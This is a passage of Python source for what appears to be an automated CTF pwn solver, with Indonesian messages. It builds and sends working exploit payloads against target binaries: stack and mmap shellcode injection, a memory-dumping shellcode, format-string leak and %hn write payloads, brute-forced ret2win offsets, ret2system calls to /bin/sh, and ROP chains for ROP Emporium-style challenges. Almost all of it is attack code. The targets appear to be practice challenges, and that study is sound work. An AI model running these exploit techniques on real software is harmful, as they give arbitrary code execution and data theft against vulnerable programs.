            raise RuntimeError(f"stage-1 terlalu panjang untuk review overflow: {len(stage)} > {offset_to_rip}")

        review = stage.ljust(offset_to_rip, b"B") + p64(jmp_rax)
        payload = b"1\nSilverPWN\n2\n0\n" + sc + b"\n3\n" + review + b"\n"

        p = self.start()
        p.send(payload)
        try:
            p.shutdown("send")
        except Exception:
            pass
        try:
            out = self.drain_available(p, timeout=3.0)
        finally:
            try:
                p.close()
            except Exception:
                pass
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Menu handoff stack shellcode",
            success=flag is not None,
            confidence=88 if flag else 35,
            output=out,
            flag=flag,
            payload=payload,
            vuln="Menu stores shellcode in one stack slot; tiny review overflow returns through jmp rax into a stack handoff stub",
            offset=offset_to_rip,
            notes=[
                f"message_fgets=0x{message_size:x}",
                f"landing_delta=0x{landing_delta:x}",
                f"jmp_rax={hex(jmp_rax)}",
                f"stage_len={len(stage)}",
                f"shellcode_len={len(sc)}",
            ],
        )

    def exploit_ret2shellcode_stack(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"shellcode payload:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        buf = leaks.get("stack_buffer")
        if not buf:
            raise RuntimeError("stack_buffer leak tidak ditemukan")
        sc = self.flag_shellcode()
        offset = 72
        if len(sc) > offset:
            raise RuntimeError(f"shellcode terlalu panjang untuk offset {offset}: {len(sc)}")
        payload = sc.ljust(offset, b"\x90") + p64(buf)
        return self.finalize(p, payload, "Ret2shellcode execstack", 86, "NX disabled; return into stack shellcode", offset, [f"shellcode_len={len(sc)}"])

    def exploit_mmap_shellcode(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"shellcode:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        sc = self.flag_shellcode()
        result = self.finalize(p, sc, "RWX mmap shellcode", 92, "Program calls attacker-controlled RWX mmap buffer", None, [f"rwx={hex(leaks.get('rwx', 0))}", f"shellcode_len={len(sc)}"])
        return result

    def first_hex_leak(self, data: bytes) -> int | None:
        match = re.search(rb"0x[0-9a-fA-F]+", data)
        if not match:
            return None
        try:
            return int(match.group(0), 16)
        except ValueError:
            return None

    def parse_xor_key(self, data: bytes) -> int | None:
        match = re.search(rb"(?:xor[-_ ]?key|key)\s*=\s*(?:0x)?([0-9a-fA-F]{1,2})", data, re.I)
        if not match:
            return None
        return int(match.group(1), 16)

    def run_two_stage_mmap_shellcode_attack(self, tube, strategy: str) -> ExploitResult:
        if self.target.elf.bits != 64:
            raise RuntimeError("two-stage mmap shellcode target harus amd64")
        output = self.recv_until_any_prompt(
            tube,
            [b"send shellcode: ", b"encoded shellcode: ", b"shellcode: "],
            timeout=1.2,
        )
        stage = self.first_hex_leak(output)
        if not stage:
            raise RuntimeError("leak alamat stage mmap tidak ditemukan")
        sc = self.flag_shellcode()
        key = self.parse_xor_key(output)
        stage_payload = bytes((byte ^ key) for byte in sc) if key is not None else sc
        tube.send(stage_payload)
        output += self.recv_until_any_prompt(tube, [b"overflow: "], timeout=1.0)
        offset = self.parse_stack_read_saved_rip_offset() or 72
        tube.send(b"A" * offset + p64(stage))
        try:
            tube.shutdown("send")
        except Exception:
            pass
        out = self.drain_available(tube, timeout=2.5)
        flag = extract_flag(output + out, self.args.flag)
        notes = [f"stage={hex(stage)}", f"shellcode_len={len(sc)}"]
        if key is not None:
            notes.append(f"xor_key=0x{key:02x}")
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=90 if flag else 35,
            output=output + out,
            flag=flag,
            payload=b"<two-stage mmap shellcode>",
            vuln="RWX mmap shellcode staged first; later stack overflow returns to the leaked stage pointer",
            offset=offset,
            notes=notes,
        )

    def exploit_two_stage_mmap_shellcode(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if not ("stage" in self.target.elf.symbols and re.search(r"shellcode", hay, re.I) and re.search(r"overflow", hay, re.I)):
            raise RuntimeError("pola two-stage mmap shellcode tidak cocok")
        p = self.start()
        try:
            return self.run_two_stage_mmap_shellcode_attack(p, "Two-stage mmap shellcode")
        finally:
            try:
                p.close()
            except Exception:
                pass

    def memory_scan_shellcode(self) -> bytes:
        context.clear(arch="amd64", os="linux")
        context.log_level = "error"
        return asm(
            """
            lea rbx, [rip]
            and rbx, -0x1000
            sub rbx, 0x200000
            mov r12, 0x400
        dump_rip_window:
            mov eax, 1
            mov edi, 1
            mov rsi, rbx
            mov edx, 0x1000
            syscall
            add rbx, 0x1000
            dec r12
            jnz dump_rip_window

            mov rbx, rsp
            and rbx, -0x1000
            sub rbx, 0x200000
            mov r12, 0x400
        dump_stack_window:
            mov eax, 1
            mov edi, 1
            mov rsi, rbx
            mov edx, 0x1000
            syscall
            add rbx, 0x1000
            dec r12
            jnz dump_stack_window

            xor edi, edi
            mov eax, 60
            syscall
            """
        )

    def exploit_shellcode_memory_scan(self) -> ExploitResult:
        p = self.start()
        banner = self.recv_until_any_prompt(p, [b": ", b":\n", b"!\n", b"\n"], timeout=0.8)
        sc = self.memory_scan_shellcode()
        p.send(sc)
        out = p.recvall(timeout=6.0)
        p.close()
        flag = extract_flag(out, self.args.flag)
        return ExploitResult(
            strategy="Shellcode memory scanner",
            success=flag is not None,
            confidence=76 if flag else 30,
            output=banner + out,
            flag=flag,
            payload=sc,
            vuln="Shellcode service with flag preloaded in memory",
            notes=[f"shellcode_len={len(sc)}", "Scanner uses write/exit only."],
        )

    def detect_fmt_base(self, prompt: bytes = b"format:\n") -> int:
        p = self.start()
        self.recv_until_any_prompt(p, [prompt], timeout=1.0)
        probe = b"AAAABBBB." + b".".join(f"%{i}$p".encode() for i in range(1, 101)) + b"\n"
        p.send(probe)
        out = p.recvall(timeout=1.0)
        p.close()
        parts = text_bytes(out).split(".")
        for idx, part in enumerate(parts, start=0):
            if "0x4242424241414141" in part:
                # The first split field is literal marker output, so idx is also the formatter index.
                return idx
        return 6

    def fmt_read_payload(self, base: int, addr: int) -> bytes:
        arg = base
        for _ in range(20):
            prefix = f"%{arg}$sEND".encode()
            pad = (-len(prefix)) % 8
            new_arg = base + (len(prefix) + pad) // 8
            if new_arg == arg:
                return prefix + b"A" * pad + p64(addr)
            arg = new_arg
        raise RuntimeError("fmt read arg tidak stabil")

    def fmt_write16_payload(self, base: int, addr: int, value: int) -> bytes:
        arg = base
        value &= 0xFFFF
        for _ in range(20):
            prefix = f"%{value}c%{arg}$hn".encode()
            pad = (-len(prefix)) % 8
            new_arg = base + (len(prefix) + pad) // 8
            if new_arg == arg:
                return prefix + b"A" * pad + p64(addr)
            arg = new_arg
        raise RuntimeError("fmt write arg tidak stabil")

    def fmt_write_halfwords_payload(self, base: int, writes: list[tuple[int, int]]) -> bytes:
        arg = base
        values = [value & 0xFFFF for _, value in writes]
        order = sorted(range(len(writes)), key=lambda idx: values[idx])
        for _ in range(40):
            printed = 0
            parts: list[str] = []
            for idx in order:
                inc = (values[idx] - printed) & 0xFFFF
                if inc:
                    parts.append(f"%{inc}c")
                    printed = (printed + inc) & 0xFFFF
                parts.append(f"%{arg + idx}$hn")
            prefix = "".join(parts).encode()
            pad = (-len(prefix)) % (4 if self.target.elf.bits == 32 else 8)
            addr_blob = b"".join(self.pack_addr(addr) for addr, _ in writes)
            new_arg = base + (len(prefix) + pad) // (4 if self.target.elf.bits == 32 else 8)
            if new_arg == arg:
                return prefix + b"A" * pad + addr_blob
            arg = new_arg
        raise RuntimeError("fmt halfword payload tidak stabil")

    def fmt_hidden_arg_halfwords_payload(self, writes: list[tuple[int, int]]) -> bytes:
        values = [value & 0xFFFF for _, value in writes]
        order = sorted(range(len(writes)), key=lambda idx: values[idx])
        printed = 0
        parts: list[str] = []
        for idx in order:
            arg_index, _raw_value = writes[idx]
            value = values[idx]
            inc = (value - printed) & 0xFFFF
            if inc:
                parts.append(f"%{inc}c")
                printed = (printed + inc) & 0xFFFF
            parts.append(f"%{arg_index}$hn")
        return "".join(parts).encode() + b"\n"

    def exploit_hidden_arg_format_write(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        symbols = self.target.elf.symbols
        if "printf" not in self.target.elf.plt and "printf" not in self.target.elf.got:
            raise RuntimeError("printf tidak ditemukan")
        if not re.search(r"fmt|format|auth=|target=|hook", hay, re.I):
            raise RuntimeError("pola format string hidden-arg tidak cocok")

        notes: list[str] = []
        if "auth" in symbols:
            writes = [(2, 0x1337)]
            notes.append("auth=0x1337 via arg2")
        elif "target" in symbols:
            writes = [(2, 0xBEEF), (3, 0xDEAD)]
            notes.append("target=0xdeadbeef via arg2/arg3")
        elif "hook" in symbols and "win" in symbols:
            win = int(symbols["win"])
            writes = [(2, win & 0xFFFF), (3, (win >> 16) & 0xFFFF)]
            notes.append(f"hook={hex(int(symbols['hook']))}")
            notes.append(f"win={hex(win)}")
        else:
            raise RuntimeError("symbol auth/target/hook+win tidak ditemukan")

        payload = self.fmt_hidden_arg_halfwords_payload(writes)
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"name: ", b"fmt: ", b"format: ", b": "], timeout=1.0)
        p.send(payload)
        try:
            p.shutdown("send")
        except Exception:
            pass
        try:
            out = self.drain_available(p, timeout=2.0)
        finally:
            try:
                p.close()
            except Exception:
                pass
        flag = extract_flag(init + out, self.args.flag)
        return ExploitResult(
            strategy="Hidden-arg format write",
            success=flag is not None,
            confidence=88 if flag else 35,
            output=init + out,
            flag=flag,
            payload=payload,
            vuln="Format string receives target pointers as hidden printf arguments and writes halfwords with positional %hn",
            notes=notes + [f"payload_len={len(payload)}"],
        )

    def exploit_format_leak(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"format:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        flag_addr = leaks.get("flag_buffer")
        if not flag_addr:
            p.close()
            raise RuntimeError("flag_buffer leak tidak ditemukan")
        base = self.detect_fmt_base()
        payload = self.fmt_read_payload(base, flag_addr) + b"\n"
        return self.finalize(p, payload, "Format string flag leak", 91, "printf(input) reads flag buffer via %s", None, [f"flag_buffer={hex(flag_addr)}", f"fmt_base={base}"])

    def exploit_format_write_hook(self) -> ExploitResult:
        p = self.start()
        init = self.recv_until_any_prompt(p, [b"format:\n"], timeout=1.0)
        leaks = self.parse_leaks(init)
        hook = leaks.get("hook_ptr")
        win = leaks.get("win")
        if not hook or not win:
            p.close()
            raise RuntimeError("hook/win leak tidak ditemukan")
        base = self.detect_fmt_base()
        payload = self.fmt_write16_payload(base, hook, win & 0xFFFF) + b"\n"
        return self.finalize(p, payload, "Format string hook write", 86, "Halfword %n rewrites hook to win", None, [f"hook={hex(hook)}", f"fmt_base={base}"])

    def echo_valley_leaks(self, tube) -> tuple[dict[int, int], bytes]:
        output = b""
        try:
            output += tube.recvuntil(b"Try Shouting: \n", timeout=1.5)
        except Exception:
            output += self.recv_until_any_prompt(tube, [b"\n"], timeout=0.5)
        leaks: dict[int, int] = {}
        for start_idx in range(1, 65, 8):
            indices = list(range(start_idx, min(start_idx + 8, 65)))
            probe = b".".join(f"%{idx}$p".encode() for idx in indices) + b"\n"
            tube.send(probe)
            try:
                line = tube.recvline(timeout=1.0)
            except Exception:
                line = tube.recv(timeout=1.0)
            output += line
            text = text_bytes(line)
            if "You heard in the distance:" in text:
                text = text.split("You heard in the distance:", 1)[1]
            parts = text.strip().split(".")
            for idx, part in zip(indices, parts):
                part = part.strip()
                if part.startswith("0x"):
                    try:
                        leaks[idx] = int(part, 16)
                    except ValueError:
                        pass
        return leaks, output

    def echo_valley_plan(self, leaks: dict[int, int]) -> tuple[int, int, list[str]]:
        def is_stack(value: int) -> bool:
            return 0x700000000000 <= value <= 0x7FFFFFFFFFFF

        symbols = [
            ("main", int(self.target.elf.symbols.get("main", 0))),
            ("echo_valley", int(self.target.elf.symbols.get("echo_valley", 0))),
            ("print_flag", int(self.target.elf.symbols.get("print_flag", 0))),
        ]
        for idx, value in sorted(leaks.items()):
            for sym_name, sym_off in symbols:
                if not sym_off:
                    continue
                for delta in range(0, 0x220):
                    base = value - (sym_off + delta)
                    if base <= 0 or base & 0xFFF:
                        continue
                    prev = leaks.get(idx - 1)
                    if prev and is_stack(prev):
                        saved_rip = prev - 8
                        notes = [
                            f"pie_base={hex(base)}",
                            f"pie_leak_idx={idx}",
                            f"pie_leak={hex(value)} ({sym_name}+{hex(delta)})",
                            f"saved_rip={hex(saved_rip)}",
                        ]
                        return base, saved_rip, notes
        raise RuntimeError("PIE leak + saved RBP stack pair tidak ditemukan")

    def run_echo_valley_attack(self, tube, strategy: str) -> ExploitResult:
        leaks, output = self.echo_valley_leaks(tube)
        base, saved_rip, notes = self.echo_valley_plan(leaks)
        print_flag = base + int(self.target.elf.symbols["print_flag"])
        rop = ROP(self.target.elf)
        ret_gadget = base + int(rop.find_gadget(["ret"]).address)
        writes = [
            (saved_rip, ret_gadget & 0xFFFF),
            (saved_rip + 8, print_flag & 0xFFFF),
            (saved_rip + 10, (print_flag >> 16) & 0xFFFF),
            (saved_rip + 12, (print_flag >> 32) & 0xFFFF),
        ]
        payload = self.fmt_write_halfwords_payload(6, writes)
        if len(payload) >= 99:
            raise RuntimeError(f"payload format terlalu panjang untuk fgets(100): {len(payload)}")
        tube.send(payload + b"\n")
        try:
            output += tube.recv(timeout=1.0)
        except Exception:
            pass
        tube.send(b"exit\n")
        try:
            output += tube.recvall(timeout=4.0)
        finally:
            try:
                tube.close()
            except Exception:
                pass
        flag = extract_flag(output, self.args.flag)
        return ExploitResult(
            strategy=strategy,
            success=flag is not None,
            confidence=86 if flag else 35,
            output=output,
            flag=flag,
            payload=b"<dynamic echo-valley fmt ret2win>",
            vuln="Format string writes saved return address to print_flag",
            notes=notes + [f"ret={hex(ret_gadget)}", f"print_flag={hex(print_flag)}", f"fmt_payload_len={len(payload)}"],
        )

    def exploit_pico_echo_valley(self) -> ExploitResult:
        p = self.start()
        return self.run_echo_valley_attack(p, "Pico Echo Valley fmt ret2win")

    def disassemble_function(self, name: str) -> str:
        return run_cmd(
            [
                "objdump",
                "-d",
                "-M",
                "intel",
                f"--disassemble={name}",
                str(self.target.binary),
            ],
            cwd=self.target.cwd,
            timeout=8,
        )

    def vulnerable_entry_appears_unprotected(self) -> bool:
        for name in ("vuln", "pwnme", "challenge", "overflow"):
            if name not in self.target.elf.symbols:
                continue
            disasm = self.disassemble_function(name)
            if not disasm or "file format" not in disasm:
                continue
            if "fs:0x28" not in disasm and "__stack_chk_fail" not in disasm:
                return True
        return False

    def exploit_bounded_admin_padding(self) -> ExploitResult:
        hay = run_cmd(["strings", "-a", str(self.target.binary)], cwd=self.target.cwd)
        if not (
            re.search(r"admin|akses", hay, re.I)
            and re.search(r"check|gagal|failed", hay, re.I)
            and re.search(r"terlalu panjang|too long|batas|limit", hay, re.I)
        ):
            raise RuntimeError("pola bounded admin/sentinel check tidak cocok")

        disasm = run_cmd(["objdump", "-d", "-M", "intel", str(self.target.binary)], cwd=self.target.cwd, timeout=8)
        limits = {0x130, 0x100, 0x80, 0x40}
        for match in re.finditer(r"cmp\s+[^,\n]+,\s*0x([0-9a-fA-F]+)", disasm):
            try:
                value = int(match.group(1), 16)
            except ValueError:
                continue
            if 16 <= value <= 1024:
                limits.add(value)

        tried: list[str] = []
        for limit in sorted(limits, reverse=True):
            candidate_offsets = [
                limit - 4,
                limit - 8,
                limit - 12,
                limit - 16,
                limit - 24,
                limit - 32,
                limit - 40,
                limit - 48,
            ]
            for offset in candidate_offsets:
                if offset < 0:
                    continue
                for marker in (p32(1), p64(1), b"\x01"):
                    if offset + len(marker) > limit:
                        continue
                    payload = b"A" * offset + marker
                    tried.append(f"{offset}+{len(marker)}<=0x{limit:x}")
                    p = self.start()
                    self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.8)
                    p.send(payload)
                    try:
                        p.shutdown("send")
                    except Exception:
                        pass
                    out = self.drain_available(p, timeout=2.0)
                    p.close()
                    flag = extract_flag(out, self.args.flag)
                    if flag:
                        return ExploitResult(
                            strategy="bounded padding admin flip",
                            success=True,
                            confidence=82,
                            output=out,
                            flag=flag,
                            payload=payload,
                            vuln="Length-bounded overflow flips an admin flag while preserving a later sentinel",
                            offset=offset,
                            notes=[f"limit=0x{limit:x}", f"marker_len={len(marker)}"],
                        )
        return ExploitResult(
            strategy="bounded padding admin flip",
            success=False,
            confidence=25,
            vuln="Length-bounded overflow flips an admin flag while preserving a later sentinel",
            notes=["Tidak ada kandidat padding yang menghasilkan flag.", "Tried: " + ", ".join(tried[:12])],
        )

    def exploit_generic_symbol_ret2win(self) -> ExploitResult:
        if self.target.elf.canary and not self.vulnerable_entry_appears_unprotected():
            return ExploitResult(
                strategy="Generic symbol ret2win",
                success=False,
                confidence=15,
                notes=["Stack canary aktif pada binary dan belum ada fungsi input yang terlihat tanpa canary."],
                vuln="Stack control-flow overwrite",
            )
        candidates = self.candidate_win_symbols()
        if not candidates:
            return ExploitResult(
                strategy="Generic symbol ret2win",
                success=False,
                confidence=10,
                notes=["Tidak ada symbol win/flag/print_flag yang cocok."],
                vuln="Stack control-flow overwrite",
            )
        if self.target.elf.pie:
            return ExploitResult(
                strategy="Generic symbol ret2win",
                success=False,
                confidence=20,
                notes=["PIE aktif tanpa leak target; generic ret2win ditahan."],
                vuln="Stack control-flow overwrite",
            )

        step = 4 if self.target.elf.bits == 32 else 8
        offsets = range(step, 240, step)
        ret_gadget = None
        if self.target.elf.bits == 64:
            try:
                rop = ROP(self.target.elf)
                gadget = rop.find_gadget(["ret"])
                ret_gadget = int(gadget.address) if gadget else None
            except Exception:
                ret_gadget = None

        for name, addr in candidates:
            for offset in offsets:
                chains = [self.pack_addr(addr)]
                if ret_gadget:
                    chains.append(self.pack_addr(ret_gadget) + self.pack_addr(addr))
                for chain in chains:
                    p = self.start()
                    self.recv_until_any_prompt(p, [b": ", b":\n", b"\n"], timeout=0.4)
                    payload = b"A" * offset + chain + b"\n"
                    p.send(payload)
                    try:
                        p.shutdown("send")
                    except Exception:
                        pass
                    try:
                        out = p.recvall(timeout=1.0)
                    finally:
                        p.close()
                    flag = extract_flag(out, self.args.flag)
                    if flag:
                        return ExploitResult(
                            strategy=f"Generic ret2{ name }",
                            success=True,
                            confidence=78,
                            output=out,
                            flag=flag,
                            payload=payload,
                            vuln="Symbol-address ret2win via stack overflow",
                            offset=offset,
                            notes=[f"{name}={hex(addr)}"],
                        )
        return ExploitResult(
            strategy="Generic symbol ret2win",
            success=False,
            confidence=25,
            notes=["Offset brute-force lokal tidak menghasilkan flag."],
            vuln="Stack control-flow overwrite",
        )

    def exploit_ret2system_string(self) -> ExploitResult:
        system_addr = self.target.elf.plt.get("system") or self.target.elf.symbols.get("system")
        if not system_addr:
            raise RuntimeError("system@plt/symbol tidak ditemukan")
        string_addr = None
        for needle in (b"/bin/cat flag.txt", b"cat flag.txt", b"/bin/sh"):
            hits = list(self.target.elf.search(needle))
            if hits:
                string_addr = int(hits[0])
                break
        if not string_addr:
            raise RuntimeError("string command/shell tidak ditemukan")

        chains: list[bytes] = []
        if self.target.elf.bits == 64:
            rop = ROP(self.target.elf)
            pop_rdi = rop.find_gadget(["pop rdi", "ret"])
            if not pop_rdi:
                raise RuntimeError("pop rdi; ret gadget tidak ditemukan")
            ret = rop.find_gadget(["ret"])
            base_chain = self.pack_addr(int(pop_rdi.address)) + self.pack_addr(string_addr) + self.pack_addr(int(system_addr))
            chains.append(base_chain)
            if ret:
                chains.insert(0, self.pack_addr(int(ret.address)) + base_chain)
        else:
            chains.append(self.pack_addr(int(system_addr)) + self.pack_addr(0) + self.pack_addr(string_addr))

        step = 4 if self.target.elf.bits == 32 else 8
        for offset in range(step, 320, step):
            for chain in chains:
                payload = b"A" * offset + chain + b"\n"
                p = self.start()
                self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.4)
                p.send(payload)
                out = self.drain_available(p, timeout=1.5)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="ret2system command string",
                        success=True,
                        confidence=84,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="ROP calls system() with an existing command string",
                        offset=offset,
                        notes=[f"system={hex(int(system_addr))}", f"string={hex(string_addr)}"],
                    )
        return ExploitResult(
            strategy="ret2system command string",
            success=False,
            confidence=25,
            vuln="ROP calls system() with an existing command string",
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def exploit_callme_sequence(self) -> ExploitResult:
        names = ["callme_one", "callme_two", "callme_three"]
        addrs = [self.target.elf.plt.get(name) or self.target.elf.symbols.get(name) for name in names]
        if not all(addrs):
            raise RuntimeError("callme_one/two/three tidak lengkap")
        rop = ROP(self.target.elf)
        arg_values = [0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D]
        chains: list[bytes] = []
        if self.target.elf.bits == 64:
            gadget = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])
            if not gadget:
                raise RuntimeError("pop rdi; pop rsi; pop rdx; ret tidak ditemukan")
            chain = b""
            for addr in addrs:
                chain += self.pack_addr(int(gadget.address))
                for value in arg_values:
                    chain += self.pack_addr(value)
                chain += self.pack_addr(int(addr))
            ret = rop.find_gadget(["ret"])
            chains.append(chain)
            if ret:
                chains.insert(0, self.pack_addr(int(ret.address)) + chain)
        else:
            gadget = (
                rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])
                or rop.find_gadget(["pop edi", "pop esi", "pop ebp", "ret"])
                or rop.find_gadget(["pop ebx", "pop esi", "pop edi", "ret"])
            )
            if not gadget:
                raise RuntimeError("pop3; ret gadget tidak ditemukan")
            args32 = [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D]
            chain = b""
            for addr in addrs:
                chain += self.pack_addr(int(addr)) + self.pack_addr(int(gadget.address))
                for value in args32:
                    chain += self.pack_addr(value)
            chains.append(chain)

        step = 4 if self.target.elf.bits == 32 else 8
        for offset in range(step, 320, step):
            for chain in chains:
                payload = b"A" * offset + chain + b"\n"
                p = self.start()
                self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.5)
                p.send(payload)
                out = self.drain_available(p, timeout=2.0)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="callme sequence ROP",
                        success=True,
                        confidence=88,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="ROP calls callme_one/two/three with required arguments",
                        offset=offset,
                        notes=[", ".join(f"{name}={hex(int(addr))}" for name, addr in zip(names, addrs))],
                    )
        return ExploitResult(
            strategy="callme sequence ROP",
            success=False,
            confidence=25,
            vuln="ROP calls callme_one/two/three with required arguments",
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def exploit_write_string_print_file(self) -> ExploitResult:
        print_file = self.target.elf.plt.get("print_file") or self.target.elf.symbols.get("print_file")
        if not print_file:
            raise RuntimeError("print_file tidak ditemukan")
        mov_gadget = self.target.elf.symbols.get("usefulGadgets")
        if not mov_gadget:
            raise RuntimeError("usefulGadgets/write gadget tidak ditemukan")
        writable = int(self.target.elf.bss()) + 0x80
        rop = ROP(self.target.elf)
        chains: list[bytes] = []
        if self.target.elf.bits == 64:
            pop_write = rop.find_gadget(["pop r14", "pop r15", "ret"])
            pop_arg = rop.find_gadget(["pop rdi", "ret"])
            if not pop_write or not pop_arg:
                raise RuntimeError("gadget pop r14/r15 atau pop rdi tidak ditemukan")
            chain = (
                self.pack_addr(int(pop_write.address))
                + self.pack_addr(writable)
                + b"flag.txt"
                + self.pack_addr(int(mov_gadget))
                + self.pack_addr(int(pop_arg.address))
                + self.pack_addr(writable)
                + self.pack_addr(int(print_file))
            )
            ret = rop.find_gadget(["ret"])
            chains.append(chain)
            if ret:
                chains.insert(0, self.pack_addr(int(ret.address)) + chain)
        else:
            pop_write = (
                rop.find_gadget(["pop edi", "pop ebp", "ret"])
                or rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])
            )
            if not pop_write:
                raise RuntimeError("gadget pop write tidak ditemukan")
            # ROP Emporium i386 usefulGadgets is exactly 'mov dword ptr [edi], ebp; ret'.
            chain = (
                self.pack_addr(int(pop_write.address))
                + self.pack_addr(writable)
                + b"flag"
                + self.pack_addr(int(mov_gadget))
                + self.pack_addr(int(pop_write.address))
                + self.pack_addr(writable + 4)
                + b".txt"
                + self.pack_addr(int(mov_gadget))
                + self.pack_addr(int(print_file))
                + self.pack_addr(0)
                + self.pack_addr(writable)
            )
            chains.append(chain)

        step = 4 if self.target.elf.bits == 32 else 8
        for offset in range(step, 320, step):
            for chain in chains:
                payload = b"A" * offset + chain + b"\n"
                p = self.start()
                self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.5)
                p.send(payload)
                out = self.drain_available(p, timeout=2.0)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="write string then print_file",
                        success=True,
                        confidence=86,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="ROP writes flag filename to writable memory and calls print_file",
                        offset=offset,
                        notes=[f"print_file={hex(int(print_file))}", f"dst={hex(writable)}"],
                    )
        return ExploitResult(
            strategy="write string then print_file",
            success=False,
            confidence=25,
            vuln="ROP writes flag filename to writable memory and calls print_file",
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def exploit_badchars_print_file(self) -> ExploitResult:
        print_file = self.target.elf.plt.get("print_file") or self.target.elf.symbols.get("print_file")
        useful = self.target.elf.symbols.get("usefulGadgets")
        if not print_file or not useful:
            raise RuntimeError("print_file/usefulGadgets tidak ditemukan")

        badchars = b"xga."
        key = 2
        filename = b"flag.txt"
        encoded = bytes(ch ^ key for ch in filename)
        if any(ch in badchars for ch in encoded):
            raise RuntimeError("encoding filename masih mengandung badchar")

        writable = int(self.target.elf.bss()) + 0x80
        rop = ROP(self.target.elf)
        chains: list[bytes] = []

        if self.target.elf.bits == 64:
            pop_all = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])
            pop_arg = rop.find_gadget(["pop rdi", "ret"])
            if not pop_all or not pop_arg:
                raise RuntimeError("gadget pop r12/r13/r14/r15 atau pop rdi tidak ditemukan")
            xor_gadget = int(useful)
            mov_gadget = int(useful) + 0xC
            chain = (
                self.pack_addr(int(pop_all.address))
                + encoded
                + self.pack_addr(writable)
                + self.pack_addr(key)
                + self.pack_addr(writable)
                + self.pack_addr(mov_gadget)
            )
            for idx in range(len(filename)):
                chain += (
                    self.pack_addr(int(pop_all.address))
                    + self.pack_addr(0)
                    + self.pack_addr(0)
                    + self.pack_addr(key)
                    + self.pack_addr(writable + idx)
                    + self.pack_addr(xor_gadget)
                )
            chain += self.pack_addr(int(pop_arg.address)) + self.pack_addr(writable) + self.pack_addr(int(print_file))
            ret = rop.find_gadget(["ret"])
            chains.append(chain)
            if ret:
                chains.insert(0, self.pack_addr(int(ret.address)) + chain)
        else:
            pop_write = (
                rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])
                or rop.find_gadget(["pop edi", "pop ebp", "ret"])
            )
            pop_xor = rop.find_gadget(["pop ebx", "pop esi", "pop edi", "pop ebp", "ret"])
            if not pop_write or not pop_xor:
                raise RuntimeError("gadget pop untuk write/xor tidak ditemukan")
            xor_gadget = int(useful) + 0x4
            mov_gadget = int(useful) + 0xC
            first = encoded[:4]
            second = encoded[4:].ljust(4, b"\x00")
            chain = (
                self.pack_addr(int(pop_write.address))
                + first
                + self.pack_addr(writable)
                + self.pack_addr(0)
                + self.pack_addr(mov_gadget)
                + self.pack_addr(int(pop_write.address))
                + second
                + self.pack_addr(writable + 4)
                + self.pack_addr(0)
                + self.pack_addr(mov_gadget)
            )
            for idx in range(len(filename)):
                chain += (
                    self.pack_addr(int(pop_xor.address))
                    + self.pack_addr(key)
                    + self.pack_addr(0)
                    + self.pack_addr(0)
                    + self.pack_addr(writable + idx)
                    + self.pack_addr(xor_gadget)
                )
            chain += self.pack_addr(int(print_file)) + self.pack_addr(0) + self.pack_addr(writable)
            chains.append(chain)

        step = 4 if self.target.elf.bits == 32 else 8
        for offset in range(step, 360, step):
            for chain in chains:
                payload = b"A" * offset + chain + b"\n"
                if any(ch in badchars for ch in payload):
                    continue
                p = self.start()
                self.recv_until_any_prompt(p, [b">", b":", b"\n"], timeout=0.5)
                p.send(payload)
                out = self.drain_available(p, timeout=2.0)
                p.close()
                flag = extract_flag(out, self.args.flag)
                if flag:
                    return ExploitResult(
                        strategy="badchars decode then print_file",
                        success=True,
                        confidence=86,
                        output=out,
                        flag=flag,
                        payload=payload,
                        vuln="ROP stores an encoded filename, decodes bad chars in memory, then calls print_file",
                        offset=offset,
                        notes=[f"print_file={hex(int(print_file))}", f"dst={hex(writable)}", f"xor_key={key}"],
                    )
        return ExploitResult(
            strategy="badchars decode then print_file",
            success=False,
            confidence=25,
            vuln="ROP stores an encoded filename, decodes bad chars in memory, then calls print_file",
            notes=["Offset sweep tidak menghasilkan flag."],
        )

    def exploit_fluff_print_file(self) -> ExploitResult:
        print_file = self.target.elf.plt.get("print_file") or self.target.elf.symbols.get("print_file")
        questionable = self.target.elf.symbols.get("questionableGadgets") or self.target.elf.symbols.get("usefulGadgets")
        if not print_file or not questionable:
            raise RuntimeError("print_file/questionableGadgets tidak ditemukan")

        filename = b"flag.txt"
        writable = int(self.target.elf.bss()) + 0x80
        rop = ROP(self.target.elf)
        chains: list[bytes] = []

        if self.target.elf.bits == 64:
            pop_arg = rop.find_gadget(["pop rdi", "ret"])
            if not pop_arg:
                raise RuntimeError("pop rdi; ret tidak ditemukan")
            xlat_gadget = int(questionable)
            bextr_gadget = int(questionable) + 0x2
